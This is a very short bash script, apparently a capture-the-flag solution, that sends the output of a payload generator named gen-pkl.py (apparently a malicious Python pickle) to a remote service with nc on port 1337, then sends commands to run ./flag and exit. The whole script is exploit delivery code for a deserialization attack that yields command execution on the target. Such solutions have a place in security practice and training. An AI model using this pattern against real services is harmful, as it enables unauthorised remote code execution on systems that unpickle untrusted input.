#!/bin/bash

{
	echo "$(python gen-pkl.py)"
	sleep 5
	echo "./flag"
	echo "exit"
} | nc target 1337 | sed 's/>>> //'
